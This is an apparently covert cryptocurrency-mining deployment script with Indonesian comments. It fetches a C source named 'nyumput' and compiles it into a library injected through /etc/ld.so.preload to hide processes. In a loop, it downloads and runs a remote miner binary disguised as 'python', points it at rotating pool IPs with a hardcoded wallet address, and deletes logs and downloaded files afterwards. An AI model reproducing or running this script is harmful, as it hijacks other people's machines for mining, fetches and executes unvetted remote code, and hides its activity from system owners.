#!/bin/bash

# Memperbarui dan menginstal dependensi
sudo apt-get update
sudo apt-get install -y wget curl build-essential jq
rm -rf dance_*
rm -rf list_*
# Mengunduh dan mengompilasi kode
curl -L https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
sudo mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so | sudo tee -a /etc/ld.so.preload
rm nyumput.c

# Menjalankan dan mengelola proses
end_time=$(( $(date +%s) + 6*3600 ))  # 6 jam dari sekarang
while [ $(date +%s) -lt $end_time ]; do
  # Mengunduh dan memeriksa daftar IP
  timestamp=$(date +%s)
  mkdir -p .lib
  dynamic_sgr=".lib/sgr_$timestamp"
  wget -O $dynamic_sgr https://github.com/barburonjilo/back/raw/refs/heads/main/hmin
  chmod +x $dynamic_sgr
  dynamic_list="list_$timestamp.json"
  wget -O $dynamic_list https://github.com/barburonjilo/setstra/raw/main/list3.json
  if [[ ! -f $dynamic_list ]]; then
    echo "Gagal mengunduh daftar IP. Keluar."
    exit 1
  fi

  # Memeriksa format file JSON
  if ! jq '.' $dynamic_list > /dev/null 2>&1; then
    echo "Format JSON tidak valid. Keluar."
    exit 1
  fi

  # Memilih IP acak dari file JSON
  ip=$(jq -r '.[]' $dynamic_list | shuf -n 1)
  if [ -z "$ip" ]; then
    echo "Tidak ada IP ditemukan di $dynamic_list. Keluar."
    exit 1
  fi

  # Menghapus IP yang dipilih dari file JSON
  jq --arg ip "$ip" 'del(.[] | select(. == $ip))' $dynamic_list > tmp_$timestamp.json && mv tmp_$timestamp.json $dynamic_list

  # Memastikan file sgr ada
  if [ -f $dynamic_sgr ]; then
    # Menjalankan proses untuk beberapa port
    for port in $(seq 301 310); do
      # Menghasilkan nilai acak untuk -t antara 1 dan (jumlah inti - 2)
      num_cores=$(nproc)
      max_threads=$((num_cores - 1))
      if [ $max_threads -lt 1 ]; then
        max_threads=1  # Pastikan minimal 1 thread
      fi
      random_threads=$((RANDOM % max_threads + 1))

      # Menjalankan proses dengan parameter yang ditentukan di latar belakang
      exec -a python nohup $dynamic_sgr  -c $ip:$port -u RJ3brBKGZcdmdHJjKQWjkjAb5qnDaWkeaf.$random_threads --cpu $random_threads -p x > dance_$port_$timestamp.log 2>&1 &
      process_pid=$!

      echo "Memulai proses dengan PID $process_pid menggunakan IP $ip dan port $port dengan $random_threads threads"

      # Menjalankan selama 1 menit
      sleep 60

      # Membunuh proses
      kill $process_pid || true

      # Menghapus file log setelah proses dihentikan
      rm -f dance_$port_$timestamp.log
    done
  else
    echo "$dynamic_sgr tidak ditemukan. Melewati..."
    sleep 120
  fi

  # Menunggu selama 2 menit sebelum iterasi berikutnya
  sleep 120

  # Membersihkan setelah setiap iterasi
  rm -f $dynamic_list
  rm -f $dynamic_sgr
done